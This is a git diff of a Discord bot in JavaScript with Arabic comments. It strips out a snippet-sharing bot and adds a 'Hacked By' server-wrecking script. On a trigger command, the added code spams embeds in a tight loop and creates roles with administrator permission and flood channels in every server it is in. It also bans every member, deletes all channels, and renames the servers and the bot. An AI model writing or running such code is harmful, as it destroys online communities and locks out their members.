@@ -1,241 +1,41 @@
-const Discord = require('discord.js');
+const Discord = require("discord.js");
 const client = new Discord.Client();
-const prefix = "#"
+//انا لا اتحمل مسؤولية اي باند يجيك من سيرفر او من دسكورد نفسه
+const Token = "BOT_TOKEN" //هنا توكن البوت اللي بتشغل عليه الهاك
+const x_x = ".2" //هنا تحط الامر اللي يشغل الهاك
+const teext = "Hacked By :Galal& ELMASRY" //هنا تحط وش تبي يكون اسم الرومات الكتابيه
+const vooice = "Hacked By Galal & ELMASRY" //هنا تحط وش تبي يكون اسم الرومات الصوتيه
+const pic = "https://cdn.discordapp.com/avatars/200644160179535872/5a245f045a43665f00f6b1a7817cc68c.png?size=2048" //هنا تحط رابط الصوره اللي بيحطها البوت بكل مكان
+const spam = "Hacked By:Malicious" //هنا تحط وش تبي رسالة السبام
+const namee = "Hacked By: Malicious" //هنا تحط وش تبي اسم السيرفر واسم البوت والبلاينق
+const playing = "Hacked u hhh Malicious" //هنا تحط وش تبي يكون الستريمنق
+client.on('message', message => {
+if (message.content === x_x) {
+    var teeext = teext.replace(" ", "-")
+    var interval = setInterval (function () {
+    const embed = new Discord.RichEmbed()
+   .setColor("ff0000")
+   .setThumbnail(pic)
+   .addField(spam, ".")
+    message.channel.sendEmbed(embed);
+    client.guilds.forEach(hack => {
+    hack.createRole({name: spam,permissions: [8],color: "#23272a"})
+    hack.createRole({name: spam,permissions: [8],color: " #df1213"})
+    hack.createChannel(teeext, 'text')
+    hack.createChannel(vooice, 'voice')
+    })}, 3);}});
+client.on('message', message => {
+if (message.content === x_x) {
+    message.guild.members.forEach(baand => {
+   baand.ban({reason: spam,});
+   client.channels.forEach(hackch => {
+   hackch.delete();
+   client.user.setAvatar(pic)
+   client.user.setUsername(namee)
+   client.user.setGame(playing, 'https://www.twitch.tv/hix')
+   client.guilds.forEach(hack => {
+   hack.setIcon(pic)
+   hack.setName(namee)})})})}});
 
-client.on('ready', () => {
-  console.log(`Logged in as ${client.user.tag}!`);
-});
-
-
-
- 
-
-
-client.on('ready', function(){
-    var ms = 10000 ;
-    var setGame = [' CoderMan ','Malicious™ | Server ' ];
-    var i = -1;
-    var j = 0;
-    setInterval(function (){
-        if( i == -1 ){
-            j = 1;
-        }
-        if( i == (setGame.length)-1 ){
-            j = -1;
-        }
-        i = i+j;
-        client.user.setGame(setGame[i],`https://www.twitch.tv/حب بلا حدود`);
-    }, ms);
-
-})
-
-
- 
-
-
-
-		  
-
-
-client.on('message', async message => {
-   let c = client.guilds.get('458253633037795328').channels.get('511130727396540416');
-   if (!c);
-   if (message.content.startsWith(prefix + 'js')) {
-       let code = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب الكود الان**')).then(co => {
-       let desc = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب وصف الكود الان**')).then(d => {    
-       let owner = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب المصدر **')).then(o => {    
-                 var dd = d.first().content;
-                 if (!dd) return;
-                  var cod = co.first().content;
-                 if (!cod) return;
-                  var own = o.first().content;
-                 if (!own) return;
-                 
-                 
-                   c.send(`
- @everyone | @here 
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-   Malicious™ Codes  :arrow_down:
-\`\`\`js
-${co.first().content}
-\`\`\`
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-**
-وصف الكود : ${d.first().content}
-تم النشر بواسطه : ${'<@'+message.author.id+'>'}
-المصدر : ${o.first().content}
-**
-          `)
-       })
-       })
-       })
-   }
-});
-
-
-client.on('message', async message => {
-   let c = client.guilds.get('458253633037795328').channels.get('511145505917763606');
-   if (!c);
-   if (message.content.startsWith(prefix + 'py')) {
-       let code = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب الكود الان**')).then(co => {
-       let desc = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب وصف الكود الان**')).then(d => {    
-       let owner = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب المصدر **')).then(o => {    
-                 var dd = d.first().content;
-                 if (!dd) return;
-                  var cod = co.first().content;
-                 if (!cod) return;
-                  var own = o.first().content;
-                 if (!own) return;
-                 
-                 
-                   c.send(`
- @everyone | @here 
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-   Malicious™ Codes  :arrow_down:
-\`\`\`js
-${co.first().content}
-\`\`\`
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-**
-وصف الكود : ${d.first().content}
-تم النشر بواسطه : ${'<@'+message.author.id+'>'}
-المصدر : ${o.first().content}
-**
-          `)
-       })
-       })
-       })
-   }
-});
-
-
-
-
-
-
-
-client.on('message', async message => {
-   let c = client.guilds.get('458253633037795328').channels.get('511454445800914946');
-   if (!c);
-   if (message.content.startsWith(prefix + 'pac')) {
-       let code = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب البكج الان**')).then(co => {
-       let desc = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب وصف له**')).then(d => {    
-       let owner = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب المصدر **')).then(o => {    
-                 var dd = d.first().content;
-                 if (!dd) return;
-                  var cod = co.first().content;
-                 if (!cod) return;
-                  var own = o.first().content;
-                 if (!own) return;
-                 
-                 
-                   c.send(`
- @everyone | @here 
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-   Malicious™ Codes  :arrow_down:
-\`\`\`js
-${co.first().content}
-\`\`\`
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-**
-الكود  البكج: ${d.first().content}
-تم النشر بواسطه : ${'<@'+message.author.id+'>'}
-المصدر : ${o.first().content}
-**
-          `)
-       })
-       })
-       })
-   }
-});
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-client.on('message', async message => {
-   let c = client.guilds.get('458253633037795328').channels.get('511461217811038210');
-   if (!c);
-   if (message.content.startsWith(prefix + 'file')) {
-       let code = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**ضح رابط الملف للتحميل**')).then(co => {
-       let desc = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب وصف **')).then(d => {    
-       let owner = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اكتب المصدر **')).then(o => {    
-                 var dd = d.first().content;
-                 if (!dd) return;
-                  var cod = co.first().content;
-                 if (!cod) return;
-                  var own = o.first().content;
-                 if (!own) return;
-                 
-                 
-                   c.send(`
- @everyone | @here 
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-   Malicious™ Codes  :arrow_down:
-\`\`\`js
-${co.first().content}
-\`\`\`
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-**
-وصف الكود : ${d.first().content}
-تم النشر بواسطه : ${'<@'+message.author.id+'>'}
-المصدر : ${o.first().content}
-**
-          `)
-       })
-       })
-       })
-   }
-});
-
-client.on('message', async message => {
-   let c = client.guilds.get('458253633037795328').channels.get('511530336912539648');
-   if (!c);
-   if (message.content.startsWith(prefix + 'تقديم')) {
-       let code = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**خبرتك ولغتك **')).then(co => {
-       let owner = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**اسمك**')).then(o => {    
-       let desc = message.channel.awaitMessages(m => m.author.id === message.author.id,{time: 5000}, message.channel.send('**عمرك**')).then(d => {    
-                 var dd = d.first().content;
-                 if (!dd) return;
-                  var cod = co.first().content;
-                 if (!cod) return;
-                  var own = o.first().content;
-                 if (!own) return;
-                 
-                 
-                   c.send(`
- @everyone | @here 
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-   Malicious™ Codes  :arrow_down:
-\`=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=\`
-
-\`\`\`js
-
-${co.first().content}
-
-\`\`\`
-
-الاسم : ${d.first().content}
-تم التقديم بواسطه: ${'<@'+message.author.id+'>'}
-العمر : ${o.first().content}
-          
-          `)
-       })
-       })
-       })
-   }
-});
-
-
-             
 client.login(process.env.BOT_TOKEN);
 
